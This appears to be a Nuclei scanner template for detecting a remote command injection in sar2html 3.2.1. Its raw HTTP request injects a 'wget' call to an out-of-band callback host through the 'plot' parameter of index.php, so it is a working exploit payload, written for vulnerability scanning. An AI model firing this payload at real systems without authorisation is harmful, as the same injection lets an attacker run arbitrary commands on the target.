http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: sar2html-rce
info:
  author: gy741
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'SAR2HTML could allow a remote attacker to execute arbitrary commands
    on the system via a command injection flaw in the index.php script. By sending
    specially-crafted commands, an attacker could exploit this vulnerability to execute
    arbitrary commands on the system.

    '
  metadata:
    max-request: 1
  name: sar2html 3.2.1 - Remote Command Injection
  reference:
  - https://www.exploit-db.com/exploits/49344
  severity: critical
  tags: sar2html,rce,oast,edb
